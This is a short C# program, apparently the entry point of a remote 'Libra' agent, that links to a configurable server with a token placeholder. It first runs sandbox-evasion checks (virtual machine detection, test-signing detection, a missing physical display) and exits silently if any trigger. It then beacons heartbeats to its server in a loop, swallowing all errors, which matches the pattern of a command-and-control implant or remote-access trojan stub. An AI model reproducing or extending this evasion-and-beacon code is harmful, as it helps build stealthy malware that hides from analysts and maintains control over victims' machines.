using Libra.Agent;
using Libra.Agent.Helper;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

if(!VirtualCheck.HasPhysicalDisplay() ||
    VirtualCheck.IsVirtualMachine() ||
    VirtualCheck.IsTestSigningEnabled())
{
    return;
}

try
{
    string serverIp = "literal:127.0.0.1";
    int serverPort = 8888;
    string token = "{AuthToken}";

    using var cts = new CancellationTokenSource();
    Console.CancelKeyPress += (sender, e) =>
    {
        cts.Cancel();
        e.Cancel = true;
    };

    try
    {
        await Runtimes.Initialize(serverIp, serverPort);

        while (!cts.Token.IsCancellationRequested)
        {
            try
            {
                await Runtimes.CheckConnectionStatus();
                await Runtimes.SendMessage(VirgoMessageType.Heartbeat, new HeartbeatMessage { Status = "alive", Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds() });
                await Task.Delay(30000, cts.Token);
            }
            catch
            {
                await Task.Delay(60000, cts.Token);
            }
        }
    }
    catch { }
}
catch { }
finally { }

